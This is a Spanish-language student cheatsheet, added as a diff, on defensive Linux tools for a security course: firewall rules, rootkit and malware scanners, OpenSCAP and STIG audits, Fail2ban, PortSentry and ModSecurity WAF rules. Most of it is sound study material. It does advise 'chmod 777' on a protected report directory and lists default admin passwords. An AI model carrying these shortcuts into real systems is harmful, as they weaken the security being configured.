@@ -1,0 +1,2075 @@
+# UFW (Firewall) [Cheatsheet "simple" en la página 7 del lab 01 || Cheatsheet "bueno" en la página 5 del lab 07]
+	## Comprobar estado del firewall:
+		sudo ufw status
+
+	## Encender firewall:
+		sudo ufw enable
+
+	## Desactivar firewall:
+		sudo ufw disable
+
+	## Ver listado de reglas existentes:
+		sudo ufw status (show firewall status) [ya sé que es la misma para comprobar el estado del firewall, pero es que tambien nos da el listado de reglas existentes]
+		-O-
+		sudo ufw status verbose (show verbose firewall status)
+		-O-
+		sudo ufw status numbered (show firewall status as numbered list of RULES) [da el listado de reglas existentes enumeradas]
+
+	## Crear reglas ALLOW:
+		sudo ufw allow ssh         # Permitir SSH (abriendo su puerto) desde cualquier IP
+		sufo ufw allow telnet      # Permitir Telnet (abriendo su puerto) desde cualquier IP
+		sudo ufw allow ftp         # Permitir Ftp (abriendo su puerto) desde cualquier IP
+		sudo ufw allow www	   # Permitir www [es http] (abriendo su puerto) desde cualquier IP
+		sudo ufw allow https       # Permitir Https (abriendo su puerto) desde cualquier IP
+
+		sudo ufw allow 22          # Permitir SSH
+		sudo ufw allow 80          # Permitir HTTP
+		sudo ufw allow 443         # Permitir HTTPS
+		sudo ufw allow 8080/tcp    # Permitir puerto TCP 8080
+
+		sudo ufw allow from 192.168.1.100  # Permitir todo desde esa IP
+
+		sudo ufw allow from 192.168.1.0/24 to any port 22  # Permitir acceso a SSH desde red local (es el CIDR de la Bridge)
+			Otro ejemplo:
+				sudo ufw allow from 172.20.10.8/28 to any port 21 # Permite acceso a conexiones FTP solo desde el host
+
+	## Crear reglas DENY:
+		sudo ufw deny from 10.0.2.15/24 # Denegar la conexion a cualquier máquina que pertenezca a un CIDR (haces "ip a" y sacas tu CIDR de la tarjeta enp0s3)
+
+		sudo ufw deny 23           # Bloquear Telnet
+		sudo ufw deny from 203.0.113.45  # Bloquear IP específica
+
+		Para bloquear conexiones DESDE cualquier puerto A la red x.x.x.x/xx:
+			sudo ufw deny out to x.x.x.x/xx
+				Ejemplo:
+					sudo ufw deny out to 156.35.0.0/16
+
+	## Insertar reglas en una posicion especifica:
+		Podemos ver las reglas enumeradas (y sus posiciones) con:
+			sudo ufw status numbered
+
+		Para insertar una regla en una posicion concreta hacemos:
+			sudo ufw insert <numero de la posicion> <regla>
+				Ejemplo:
+					sudo ufw insert 1 allow from 172.20.10.8/28 to any port 21 (esto inserta en la posicion 1 una regla que permite las conexiones ftp desde cualquier dispositivo de la red local (direcciones indicadas mediante el CIDR de la tarjeta Bridge) abriendo el puerto de ftp (21 (tambien es el 20, pero durante las practicas de clase y practicando el examen se pone el 21 como de forma "predeterminada", es como el segundo puerto de https, está ahi pero es raro que se use)))
+
+	## Eliminar reglas:
+		Usando el listado de reglas enumeradas (sudo ufw status numbered):
+			sudo ufw delete <Nº de la regla enumerada>
+
+		Sin el listado de reglas enumeradas:
+			sudo ufw delete <servicio>
+
+	## Configurar la política predeterminada:
+		sudo ufw default <deny -O- allow> <incoming -O- outgoing>
+		
+		Ejemplo:
+			sudo ufw default allow outgoing (permite el tráfico saliente)
+			sudo ufw default deny incoming (deniega el tráfico entrante)
+
+# OJO: SI BLOQUEAMOS TODO EL TRAFICO Y ABRIMOS HTTP Y HTTPS Y NO FUNCIONA, por ejemplo apt, HAY QUE ABRIR EL PUERTO DEL DNS (53)
+
+----------------------------------------------------------
+# Lynis
+Primero instalamos el paquete kbtin, que incluye la herramienta ansi2html
+
+	Evaluar nivel de seguridad:
+		sudo lynis audit system | ansi2html > report.html
+
+----------------------------------------------------------
+# passwd (para cambiar la contraseña del usuario actual)
+	sudo passwd
+	Rellenas los campos del "formulario" para cambiar la contraseña
+
+----------------------------------------------------------
+# Chkrootkit (software de escaneo de rootkits)
+	sudo apt install chkrootkit
+
+	Para comprobar archivos:
+		sudo chkrootkit -r <file>
+
+	Para comprobar todo el sistema:
+		sudo chkrootkit
+
+----------------------------------------------------------
+# Rkhunter (software de escaneo de rootkits en todo el sistema)
+	sudo apt install rkhunter
+
+	Para escanear todo el sistema (creo que solo puede hacer eso) (NOTA: los resultados se guardan en /var/log/rkhunter.log):
+		sudo rkhunter -c 
+
+----------------------------------------------------------
+# Clamav (software de escaneo de malware, es una herramienta antimalware)
+
+	sudo apt install clamav
+
+	Actualizar las firmas del software anti malware:
+		sudo freshclam
+		// Si no deja:
+			Parar el servicio con:
+				sudo service clamav-freshclam stop 
+			Y ejecutar de nuevo:
+				sudo freshclam
+
+	Para escanear un directorio:
+		sudo clamscan -r -i <dir>
+
+----------------------------------------------------------
+# Fichero robots.txt
+Es interesante investigarlo para saber si una web está revelando rutas "secretas" en este fichero público.
+
+	Acceder al fichero robots.txt de una web:
+		<URL de la web>/robots.txt
+
+----------------------------------------------------------
+# Exiftool (herramienta para inspeccionar los metadatos de un fichero)
+
+	sudo apt install exiftool
+
+	Uso básico:
+		exiftool -s <file>
+
+----------------------------------------------------------
+# Webmin (permite la administracion de sistemas)
+Se puede acceder al panel de Webmin con localhost:10000 poniendo de username el mismo que el del usuario activo en Ubuntu y la misma contraseña del usuario en Ubuntu
+
+Permite:
+	Ver los parametros de uso de recursos del servidor (ver el consumo de recursos de la máquina)
+		Click en "Dashboard"
+
+	Crear grupos o usuarios y administrarlos (a ambos)
+		Click en "System"
+		Click en "Users and Groups"
+
+		NOTA: Si se produce un error al eliminar un usuario mediante WebMin, simplemente crea un archivo /etc/postfix/main.cf vacío. Si no se encuentra este archivo, es posible que algunas versiones de WebMin falle al eliminar un usuario debido a que se intenta actualizar la configuración del correo al borrar el usuario.
+		
+	Administrar los paquetes
+		Puedes actualizar, instalar, ver información y eliminar paquetes del sistema mediante WebMin. También puedes ver dónde está el inventario de paquetes del sistema.
+		
+		Click en "System"
+		Click en "Software Packages"
+		Para ver los paquetes instalados tienes que hacer click en "Browse Package Tree" y despliegas todos los desplegables
+		Haciendo clic en un paquete puedes ver su descripción, detalles (version, etc), desinstalarlo, etc
+		Para instalar un paquete nuevo...
+			Seleccionar la opción "Package from APT"
+			Pones en el campo el nombre del paquete como si lo hicieras manualmente con apt (Ej: exiftool a secas)
+
+	Ver el inventario de programas en ejecución en un sistema y administrarlos (suspenderlos/pararlos, matarlos, ver su información, etc)
+		Click en "System"
+		Click en "Running Processes"
+
+	Deshabilitar o desinstalar servicios del sistema no deseados o potencialmente peligrosos que se inician en el momento del arranque
+		Click en "System"
+		Click en "Bootup and Shutdown"
+		Seleccionas el servicio y ya puedes administrarlo como desees y ver su información
+
+	Ver la configuración del servidor SSH
+		Click en "Servers"
+		Click en "SSH Server"
+
+	Examinar los logs (puede servir para buscar comportamientos sospechosos)
+		Click en "System"
+		Click en "System Logs"
+		
+		Podemos filtrar el contenido del log buscando palabras. Ej:
+			Poner "login" en el filtro y vemos todos los logs en los que salga dicha palabra
+
+----------------------------------------------------------
+# Wazuh (es un software XDR profesional y un HIDS)
+Tiene como objetivo detectar, analizar y responder a amenazas de seguridad en múltiples niveles del sistema.
+
+Es una solución de seguridad integral que combina varias capacidades para proteger endpoints, servidores, redes y aplicaciones.
+
+DETECTA COMPORTAMIENTOS SOSPECHOSOS
+
+Te permite:
+	Monitorear tu VM para que tengas una vision completa de lo que está sucediendo en ella y así entender parte de las funciones que puede realizar un XDR en una máquina y su importancia en un despliegue real.
+
+	VIGILAR ANOMALÍAS que ocurren en tu MV
+
+Para iniciarlo:
+	Vete a la carpeta de wazuh
+	Vete dentro de la carpeta single_node
+	
+		Si lo inicias por primera vez haz esto también:
+			docker-compose -f generate-indexer-certs.yml run --rm generator
+
+	Haz docker-compose up -d
+	Espera a que todo el sistema se active
+	Abre el navegador de la MV y escribe la URL: https://127.0.0.1
+		La cuenta de usuario predeterminada es: admin
+		Y la contraseña es: SecretPassword
+
+Para generar los agentes que Wazuh monitoriza:
+	Click en "Deploy new agent"
+	Rellenamos el formulario
+		DEB amd64
+		Server address: la misma que la de Wazuh (127.0.0.1)
+		Las opciones opcionales no las tocamos (no hace falta ni lo has hecho practicando el examen)
+		Por último, ponemos los comandos del final en el agente
+
+Para ver el registro de eventos que ocurren en un agente:
+	Abre el panel lateral
+	Click en "Agents management"
+	Click en "Summary"
+	Click en el agente deseado
+	Click en el link superior izquierdo "Threat Hunting"
+	Click en "Events"
+	Abajo tienes la tabla de eventos, vete refrescandola con el boton para ver los eventos que ocurren en tiempo "real" en el agente
+
+----------------------------------------------------------
+# Debsums (para verificar la integridad de los paquetes instalados con apt)
+Puedes asegurarte de que no se instalen paquetes dañados
+
+	Comprobar su documentación para saber cómo usarlo:
+		man debsums
+
+	Verificar integridad de un paquete
+		sudo debsums <paquete>
+		Ej:
+			sudo debsums bash
+
+	Verificar todos los paquetes instalados
+		sudo debsums -s // el parametro -s solo muestra los archivos que fallan la verificacion
+
+	Para ver qué versiones están instaladas en un paquete y si hay versiones mas recientes disponibles
+		sudo apt-show-versions <paquete>
+		Ejemplo:
+			sudo apt-show-versions bash
+
+----------------------------------------------------------
+# Oscap (OpenSCAP)
+Hardening aplicando perfiles de seguridad y evaluación del nivel de seguridad con estos.
+
+Instalacion
+	apt-get install libopenscap8
+
+	Descarga de la última version de las politicas de seguridad
+		Anotamos la ultima version mirando la última release: https://github.com/ComplianceAsCode/content/releases
+
+		wget https://github.com/ComplianceAsCode/content/releases/download/v<UltimaVersion>/scap-security-guide-<UltimaVersion>.zip
+
+		Ejemplo:
+			wget https://github.com/ComplianceAsCode/content/releases/download/v0.1.76/scap-security-guide-0.1.76.zip
+
+
+Examinar los perfiles de seguridad disponibles para Ubuntu 22.04 en los ficheros descargados:
+	sudo oscap info <carpeta descomprimida>/ssg-ubuntu2204-ds.xml
+
+	ANOTA LOS PERFILES Y SUS IDS
+
+	# RECUERDA [Tema 3, diapo 61]: 
+		## Los level 1: Los controles de este nivel tienen la intencion de:
+			Ser prácticos y no causar "daños" innecesarios (mantienen la funcionalidad del software aceptablemente)
+			Proporcionar una ventaja de seguridad sustancial
+		## Los level 2: Amplian los level 1 con controles que tienen las siguientes características:
+			Diseñados para entornos o casos de uso donde la seguridad es clave (por encima de otras cosas)
+			Implementar una defensa en profundidad
+			PODRÍA AFECTAR A LA FUNCIONALIDAD DE LA MÁQUINA O SUS SERVICIOS DE ALGUNA MANERA, O A SU RENDIMIENTO
+		## Los "niveles especiales": ...
+
+
+Evaluar una máquina:
+	sudo oscap xccdf eval --profile <id del perfil de seguridad> --results <nombreFicheroXmlParaResultadosEnXml>.xml --report <nombreFicheroHtmlParaResultadosEnHtml>.html <rutaAlFicheroXmlQueContieneElPerfilDeSeguridadElegido>.xml
+		
+		Donde:
+			xccdf eval: Para evaluar el estado de seguridad de la máquina
+			--profile <id del perfil de seguridad>: El id de cada perfil lo puedes examinar con:
+				sudo oscap info <carpeta descomprimida>/ssg-ubuntu2204-ds.xml
+	
+	Ejemplo:
+		sudo oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis_level1_server --results evaluacionInicialOSCAP.xml --report evaluacionInicialOSCAP.html ./ssg-ubuntu2204-ds.xml
+
+
+## IMPORTANTE: LA PUNTUACION DE SEGURIDAD DEL SISTEMA QUE NOS DA ES BASADA EN LA POLITICA DE SEGURIDAD USADA
+
+Correccion con OpenSCAP (es oscap, no te rayes)
+
+	Simplemente hay que repetir la orden para evaluar la máquina, pero añadiendo --remediate despues del oscap xccdf
+		sudo oscap xccdf eval --remediate --profile xccdf_org.ssgproject.content_profile_cis_level1_server --results evaluacionRemediacionConOSCAP_OSCAP.xml --report evaluacionRemediacionConOSCAP_OSCAP.html scap-security-guide-0.1.76/ssg-ubuntu2204-ds.xml
+
+			Donde:
+				--remediate: Para remediar automáticamente los controles de seguridad que estén sin implementar
+
+	// La evaluacion se hace automaticamente ya que en esta forma de correccion solo añadimos el --remediate
+	// Hay que evaluar tambien con Lynis (o por lo menos en la practica 6)
+		sudo lynis audit system | ansi2html > evaluacionRemediacionConOSCAP_LYNIS.html		
+
+
+
+Correccion con scripts de Bash
+	
+	En la carpeta de las reglas de seguridad inicialmente descargadas hay otra carpeta "bash", entras en ella
+
+	Ahora buscas el script que tiene el nombre correspondiente a:
+		ssg-ubuntu2204-ds.xml // de aqui sacamos el "ubuntu2204"
+		el id del perfil de seguridad a usar (nivel y si es server o workstation)
+
+	Buscando con lo anterior encontramos nuestro script y le damos los permisos de ejecucion (chmod +x ./script.sh)
+
+	Ejecutamos el script con sudo y evaluamos la máquina tras la correccion con el script de Bash
+		sudo ./script.sh
+		sudo oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis_level1_server --results evaluacionRemediacionConBASH_OSCAP.xml --report evaluacionRemediacionConBASH_OSCAP.html ./ssg-ubuntu2204-ds.xml
+
+	// Hay que evaluar tambien con Lynis (o por lo menos en la practica 6)
+		sudo lynis audit system | ansi2html > evaluacionRemediacionConBASH_LYNIS.html
+
+----------------------------------------------------------
+# SCC (SCAP Compliance Checker) [Clave de búsqueda: Hace uso de los STIGs (incluyen las categorías CAT, MAC y los 9 perfiles de aplicacion (Diapo 51 del tema 3) )]
+Permite auditar un sistema segun las especificaciones de los STIGs de la DISA de los EEUU
+
+Usar SCC te permite auditar tu máquina virtual de Ubuntu y generar un informe con sus resultados
+
+OJO: Esta herramienta realiza auditorías automáticas, pero no correcciones
+
+SUPONEMOS QUE ESTAMOS TRABAJANDO EN UNA MV UBUNTU CON GUI!!!
+
+Instalacion:
+	Descargamos la herramienta visitando el enlace:
+		https://dl.dod.cyber.mil/wp-content/uploads/stigs/zip/scc-5.10.1_ubuntu22_amd64_bundle.zip
+
+		Link alternativo (hay que ir a la seccion "Scap Tools"):
+			https://public.cyber.mil/stigs/scap/
+
+	Descomprimimos el zip
+		unzip -d <directorio> <fichero>
+
+	Entramos en la carpeta descomprimida y ejecutamos:
+		sudo dpkg -i <ruta del fichero .deb>
+			
+			Donde:
+				El fichero .deb es el fichero de instalacion de la herramienta
+
+	Ejecutamos la herramienta con:
+		sudo /opt/scc/scc
+
+	E ignoramos las advertencias
+
+	Lo del centro de la pantalla son los STIGs que tenemos "instalados" por defecto
+
+	En el primer uso de la herramienta hay que hacer clic en "Refresh"
+
+
+Uso:
+	Marcamos el STIG (o STIGs) a usar
+
+	Hay que marcar la opción "Ejecutar contenido independientemente de la aplicabilidad"/"Run content regardless of applicability" para que SCC escanee el sistema operativo
+
+	En "Profile" (en el panel de la derecha) podemos seleccionar el MAC
+
+	Iniciamos el escaneo con el boton "Start Scan" de la izquierda
+
+	El sistema nos avisará de que el STIG tiene unos controles que te hacen preguntas que se deben responder manualmente, y cómo crear las respuestas. No hicimos eso en la prueba de la práctica ni en clase, por lo que podemos simplemente continuar escaneando el sistema con todo lo que es automatizable.
+
+	Esperamos a que finalice la auditoría del sistema y se genere un informe.
+	
+	Accedemos al directorio (DESDE EL DIRECTORIO HOME DEL USUARIO [haz cd]) en el que se encuentra el informe (que es un HTML) y lo abrimos
+		cd SCC/Sessions/<fecha y hora en que se publicó el informe>/<informe>.html
+
+	Dentro del informe, vamos a "Todas las configuraciones"/"All Settings" y veremos los resultados
+
+	Para volver a la ventana inicial con los STIGs en SCC hay que hacer clic en el boton "Show Content" del panel izquierdo de la pantalla
+
+
+Instalacion de nuevos STIGs
+	Volvemos a visitar el link: https://public.cyber.mil/stigs/scap/
+
+	Buscamos el STIG deseado y lo descargamos
+
+	Vamos a SCC y hacemos clic en "Install"
+
+	Hacemos clic en "Select Content File(s) to Install" sin tocar las opciones de encima de dicho botón.
+
+	Seleccionamos el STIG descargado
+
+	Hacemos clic en "Install"
+
+Hardening de Firefox
+	Creamos la carpeta 
+		mkdir /etc/firefox/policies
+
+	Creamos en esa carpeta el fichero
+		nano policies.json
+
+		Con el contenido:
+			{
+ 			  "policies": {
+   			    "BlockAboutConfig": true
+ 			  }
+			}
+			
+	Volvemos a pasar el STIG de Firefox con SCC e implementamos las soluciones (o algunas de ellas, depende de lo que necesites, en la práctica pedían entre 1 y 2) sugeridas por el STIG
+
+	Si pasamos otra vez el STIG con las soluciones (o algunas de ellas) implementadas veremos que la puntuacion de seguridad ha subido
+	
+	# CONCLUSION: Despues de mirar unos cuantos checks del ultimo informe generado nos damos cuenta de que SCC sólo mira el contenido del policies.json, con lo cual configurando de las formas que nos indican los checks hardenizamos firefox.
+		Si en otra máquina le pasamos un policies.json que de una puntuacion muy alta => hardenizaríamos el firefox de dicha máquina con ello dando la misma puntuacion que en la máquina original del policies.json
+	
+----------------------------------------------------------
+# LYNIS vs OSCAP vs SCC (SCAP Compliance Checker) para obtener puntuacion de seguridad
+
+OJO: Los perfiles SCAP (los que usas con oscap) y Lynis miden cosas diferentes
+
+Si la puntuacion es en base a una politica de seguridad => OSCAP
+Si quieres obtener la puntuacion del nivel de seguridad en base a "nada" (a ningun perfil, politica, etc) => LYNIS
+	Te sirve para evaluar la seguridad (junto con su respectiva puntuacion de seguridad) hardenizada con el CIS Benchmark
+Si la puntuacion es en base a los STIGs, MAC, CAT, etc => SCC
+	[Diapo 9 del lab 06, Diapo 48 en adelante (creo) del tema 3]
+
+----------------------------------------------------------
+# usg (Para hacer auditorias de seguridad con un perfil de CIS) [USG ES DE UBUNTU PRO, se obtiene con la suscripcion]
+
+Para auditar:
+	sudo usg audit <Profile>
+
+		Siendo "Profile" uno de estos valores a escoger:
+			cis_level1_workstation
+			cis_level1_server
+			cis_level2_worlstation
+			cis_level2_server
+
+	El informe generado estará en /var/lib/usg/ (ES UNA CARPETA PROTEGIDA, NO TE VA A DEJAR ENTRAR Y "sudo cd" NO FUNCIONA)
+		sudo chmod 777 /var/lib/usg
+
+		Ahora podemos acceder al directorio
+
+		sudo chmod 777 *
+
+		Cambiamos el propietario del informe (originalmente es root y eso nos va a traer problemas)
+			sudo chown <nuevo_usuario> <archivo>
+				Ej: sudo chown ssiuser <informe>.html
+
+		Copiamos el fichero a una directorio que no nos de problemas con los permisos
+			cp <informe>.hmtl /home/ssiuser/<informe>.html
+			
+		Ahora podemos abrir el informe html
+
+Para correccion:
+	sudo usg fix <Profile>
+
+		Siendo "Profile" uno de estos valores a escoger (que sea el mismo que en audit a poder ser):
+			cis_level1_workstation
+			cis_level1_server
+			cis_level2_worlstation
+			cis_level2_server
+
+Para generar un script con la implementacion de todos los controles de seguridad de un perfil CIS elegido (https://ubuntu.com/security/certifications/docs/usg/cis/compliance):
+	sudo usg generate-fix <Profile> --output script.sh
+
+		Siendo "Profile" uno de estos valores a escoger:
+			cis_level1_workstation
+			cis_level1_server
+			cis_level2_worlstation
+			cis_level2_server
+
+----------------------------------------------------------
+# PiHole (es un servidor de filtrado DNS) [Corresponde a la parte de la teoría del SNI (Secure Network Infrastructure)]
+
+Te permite tener un servidor DNS que además filtra cualquier solicitud que reciba usando un enfoque blocklist: cualquier conexion realizada a una IP presente en la lista de bloqueo se anulará
+
+URL de PiHole al lanzar su contenedor Docker: 127.0.0.1/admin
+	La contraseña de administrador es: test123...
+
+Para que empiece a filtrar:
+	Hay que cambiar el DNS de nuestra tarjeta de red enp0s3 a 127.0.0.1 (PiHole se ejecuta localmente)
+	
+	Consulta la imagen de la página 8 del lab 7 [OJO: NO PONGAS eth0, SINO LA TARJETA DE RED QUE USAS PARA SALIR A INTERNET (NORMALMENTE ES LA enp0s3)]
+	
+	Hay que hacer "sudo netplan apply" para que los cambios se apliquen
+
+	Si vamos a una web con publi la va a bloquear
+
+Para mejorar las listas de bloqueo (te permitirá bloquear conexiones a mas sitios web maliciosos CONOCIDOS):
+	El enlace con la lista mas completa en formato compatible con PiHole: https://blocklistproject.github.io/Lists/everything.txt
+
+	Vamos a la web de PiHole:
+		Click en "Lists"
+			Metemos en el campo "Address" el link de la lista anterior
+			Le damos a "Add blocklist"
+
+		Click en "Tools" en el panel izquierdo
+		Click en "Update Gravity"
+		Actualizamos gravity para incorporar las nuevas URL a la lista de bloqueo
+
+----------------------------------------------------------
+# NextDNS (es un servidor DNS seguro para tu protección)
+Link: https://nextdns.io/
+	Le damos a "Try it now"
+
+----------------------------------------------------------
+# Fail2ban (para bloquear las conexiones de las máquinas que tratan de acceder a tu servicio SSH sin exito multiples veces)
+
+Bloquea el tipo de ataque de fuerza bruta sobre cualquier servicio (Ej: SSH, FTP (vsftpd), ...)
+
+Procesa los logs del sistema para buscar indicios de ataques.
+	Cuando se detectan, de acuerdo con las reglas que se le definan, fail2ban agrega una nueva regla al firewall que bloquea la IP desde la que se hizo el intento de ataque identificado.
+	
+	Esta regla bloquea la IP del atacante de forma temporal o permanente, dependiendo de la configuracion
+
+Se usa típicamente para proteger ssh, pero tiene varias reglas predefinidas por defecto (llamadas jails) que tambien funcionan con otros servicios, como Apache2 o Nginx (servidores web)
+
+
+Instalacion:
+	sudo apt update
+	sudo apt install fail2ban -y
+
+
+Habilitar y configurar el "jail" para SSH:
+	sudo nano /etc/fail2ban/jail.local
+
+	Pon el siguiente contenido:
+		[sshd] (si fuera para vsftpd sería [vsftpd])
+		enabled = true
+		port = ssh (si fuera para vsftpd habria que usar el puerto de FTP: 20,21)
+		filter = sshd (si fuera para vsftpd sería vsftpd)
+		logpath = /var/log/auth.log
+		maxretry = 3 # se permiten 3 intentos fallidos
+		findtime = 60 # tiempo para conectarte con una contraseña correcta (60 segundos)
+		bantime = 1800 # se bloquea por 1800 segundos (30 minutos)
+
+	Reiniciamos Fail2Ban y lo habilitamos:
+		sudo systemctl restart fail2ban
+		sudo systemctl enable fail2ban
+
+
+Verificar que Fail2Ban ha bloqueado la IP:
+	sudo fail2ban-client status sshd
+
+	Veremos la info de los bloqueos y la lista de IPs baneadas entre otras cosas
+
+
+Quitar el bloqueo (desbanear una IP):
+	sudo fail2ban-client set sshd unbanip <IP baneada>
+
+----------------------------------------------------------
+# PortSentry (para bloquear conexiones de atacantes que estan intentando escanearte) [ES UN HONEYPOT]
+
+Te permite proteger un host contra los intentos de escaneo con nmap usando portsentry, todo sin interferir con el firewall de la máquina.
+
+PortSentry puede detectar escaneos de puertos y bloquearlos, por lo que la máquina que está escaneando no obtendrá información.
+
+Una de las formas de uso que tiene:
+	Combinarlo con el firewall UFW para emular el comportamiento de un Honeypot.
+
+	Para ello, dejaremos algunos puertos abiertos a propósito en el firewall, aunque no haya ningún servicio que los escuche.
+
+	Se detectarán los intentos de escaneo a través de estos puertos "falsamente abiertos" y la herramienta procederá a prohibir la máquina que hace el escaneo.
+
+	Ten en cuenta que portsentry no puede escuchar en los puertos que tienen servicios reales que los están usando, ya que "ocupan" los puertos.
+
+
+# Instalacion:
+	sudo apt update
+	sudo apt install portsentry -y
+
+	Comprobamos que está activo:
+		sudo systemctl status portsentry
+
+
+# Configurar el modo de trabajo de PortSentry:
+	Hay dos modos:
+		Modo básico (valores: "tcp", "udp"):
+			Escucha una lista estática de puertos predefinidos en el archivo de configuración.
+
+			No utilizaremos este modo ya que la presencia de la herramienta se puede detectar fácilmente.
+
+		Modo stealth avanzado (valores: "atcp", "audp"):
+			Usa un raw socket para detectar escaneos y así la herramienta no puede ser detectada fácilmente:
+				Los puertos parecen tener el servicio "normal" en él, pero es portsentry quien está escuchando y detectando actividad sospechosa
+
+
+	## Configuramos la herramienta con el modo "stealth avanzado":
+		sudo nano /etc/default/portsentry
+
+		Modifica las líneas de la siguiente forma:
+			TCP_MODE="atcp"
+			UDP_MODE="audp"
+
+	Reiniciamos la herramienta:
+		sudo systemctl restart portsentry
+
+
+# Habilitar puertos falsos en el firewall (honeypot):
+	sudo ufw allow 111,113,139/tcp (OJO: Tienen que ser puertos que no estén ni vayan a ser ocupados)
+	sudo ufw allow 333,1234/udp (OJO: Tienen que ser puertos que no estén ni vayan a ser ocupados)
+
+	Verificamos las reglas:
+		sudo ufw status
+		
+
+# Configuracion de las posibles respuestas a un intento de escaneo:
+	sudo nano /etc/portsentry/portsentry.conf
+
+	Asignamos a las siguientes variables el valor deseado:
+		BLOCK_UDP="<valor>"
+		BLOCK_TCP="<valor>"
+
+		Posibles valores de BLOCK_UDP y BLOCK_TCP:
+			## Valor 0 (por defecto):
+				Solo hacer log del tráfico sospechoso en /var/log/syslog
+
+			## Valor 1:
+				Bloquear a la máquina "infractora"
+
+			## Valor 2:
+				Ejecutar un programa como respuesta
+
+				Esto nos da mucha flexibilidad y permite respuestas "salvajes" a los intentos de escaneo
+
+	Reiniciamos la herramienta:
+		sudo systemctl restart portsentry
+
+
+# Prueba de funcionamiento:
+	Hacemos un nmap desde el host a la MV
+		nmap -sS <IP de la MV (controla si es la de la enp0s3 o enp0s8)>
+
+	Acciones para examinar la respuesta:
+		## Si solo haciamos log:
+			Examinamos las entradas que indican la detección de escaneo.
+				sudo grep "portsentry" /var/log/syslog
+				-O-
+				sudo tail -f /var/log/syslog | grep "portsentry"
+
+		## Si bloqueabamos a la máquina infractora:
+			Comprobamos que la máquina atacante está bloqueada:
+				cat /etc/hosts.deny
+
+			Veremos la IP del infractor añadida (tambien se puede ver en la tabla de rutas: netstat -rn)
+
+			### Para quitar el bloqueo:
+				Editamos el siguiente fichero eliminando la línea con la IP a desbloquear:
+					sudo nano /etc/hosts.deny
+
+				Eliminamos la regla del firewall que rechaza (REJECT) todo el tráfico del cliente infractor:
+					sudo route del -host <IP del cliente infractor> reject
+
+				Comprobamos que la regla se ha eliminado con:
+					netstat -rn
+
+----------------------------------------------------------
+# Maltrail (es un IDS de red (NIDS))
+Puede detectar escaneos de puertos
+
+Detecta trafico malicioso de forma autonoma y en un nodo de monitorizacion por el que se supone que pasa todo el trafico de una red (proxy inverso ¿?)
+
+# Credenciales:
+	Usuario: admin
+	Contraseña: changeme!
+
+# Ejecución:
+	Vas a la carpeta descomprimida y ejecutas el modulo Python:
+		sudo python3 ./server.py
+
+	Se accede a la interfaz desde el navegador con la URL: http://localhost:8338
+
+----------------------------------------------------------
+# WAF (mod_security) [es un NIDS (creo)] [DA PROTECCION EN TIEMPO DE EJECUCION].
+Lab 10, bloque 2, puede que te interese la página 7
+
+## Instalacion:
+	sudo apt install libapache2-mod-security2
+
+	### Instalar un OWASP ModSecurity Core Rule Set (CRS) actualizado:
+
+		#### Movemos y cambiamos el nombre del siguiente archivo de ModSecurity para tener una configuración recomendada predeterminada inicial
+			sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf		
+
+		#### Luego, desde el host Ubuntu:
+
+			##### Descargamos la última versión de OWASP ModSecurity CRS desde GitHub:
+				git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git
+
+			##### Copiamos la carpeta descargada a /volume_data/rules de la infraestructura del lab10:
+				cp ./owasp-modsecurity-crs <donde sea>/volume_data/rules/owasp-modsecurity-crs
+
+				Esto hará que dicha carpeta aparezca en el sistema de archivos del contenedor proxy (En el directorio /rules de dicho contenedor)
+
+			##### Iniciamos sesion en el Proxy y vamos DENTRO de la carpeta owasp-modsecurity-crs en /rules
+				cd /rules/owasp-modsecurity-crs (recuerda que el "owasp-modsecurity-crs" son las reglas descargadas)
+
+				###### En ese mismo directorio hacemos:
+					cp crs-setup.conf.example /etc/modsecurity/crs-setup.conf
+					cp -r rules/ /etc/modsecurity/
+
+			##### Modificamos el siguiente fichero para que coincida con la ruta de los archivos descargados:
+				sudo nano /etc/apache2/mods-available/security2.conf
+
+					# El archivo de configuración debe quedar así (elimina otros contenidos que pueda tener):
+						<IfModule security2_module>
+							# Default Debian dir for modsecurity's persistent data
+							SecDataDir /var/cache/modsecurity
+
+							# Include all the *.conf files in /etc/modsecurity.
+							# Keeping your local configuration in that directory
+							# will allow for an easy upgrade of THIS file and
+							# make your life easier
+
+							# El valor de IncludeOptional debe ser la ruta del archivo crs-setup.conf
+							IncludeOptional /etc/modsecurity/*.conf
+
+							# El valor del Include debe apuntar al conjunto de reglas
+							Include /etc/modsecurity/rules/*.conf
+						</IfModule>
+
+			##### Reiniciamos Apache2 de nuevo para que los cambios surtan efecto
+				sudo systemctl restart apache2
+
+
+## El log donde se ve si una regla saltó: 
+	/var/log/apache2/modsec_audit.log
+	-O- (a prueba y error)
+	/var/log/apache2/error.log
+
+
+## Crear regla de prueba para el waf:
+	sudo nano /etc/apache2/sites-enabled/000-default.conf
+
+	### Dentro del elemento VirtualHost pones:
+		# Habilita ModSecurity en modo de intercepción (valor "On") [detecta amenazas entrantes y las bloquea] ||| El modo de deteccion (valor "DetectionOnly") [detecta amenazas entrantes pero solo las registra en un log, lo cual es útil cuando se prueba que el WAF no está bloqueando solicitudes legítimas]
+		SecRuleEngine On 
+
+		# Reglas creadas:
+		SecRule ARGS:<nombre parametro> "@contains <valor parametro para que la regla salte>" "id:1234,deny,status:403,msg:'<mensaje a mostrar en el log (/var/log/apache2/modsec_audit.log (sino entonces sale en el otro)) cuando la regla salte>'"
+			Ejemplo:
+				SecRule ARGS:testarg "@contains ssi" "id:1234,deny,status:403,msg:'regla de prueba SSI disparada!'"
+				SecRule ARGS:testarg "@true" "id:1234,deny,status:403,msg:'regla de prueba SSI disparada!'"
+					Esta bloquea cualquier solicitud que tenga el parámetro "testarg" independientemente del valor que se le asigne
+				SecRule ARGS:rick "@true" "id:2025,deny,status:403,log,msg:'Me la quieren liar',tag:'pickle'" (el mensaje en el log saldrá con un '[tag "pickle"]' al final) (el "log" puedes ponerlo si ves que salta la regla, pero no se regleja en los logs. SI SE VE EN LOS LOGS SIN EL log QUITALO DE LA REGLA)
+
+	### Reinicias Apache:
+		sudo systemctl restart apache2
+
+
+## Activar la regla de prueba del waf:
+	En el navegador pones la URL:
+		http://<IP del proxy que muestra al público>/?testarg=123ssi
+		-O-
+		http://<IP del proxy que muestra al público>/?testarg=ssi
+
+
+## Para comprobar que las reglas CRS se estan leyendo, simplemente hacemos esto en el navegador:
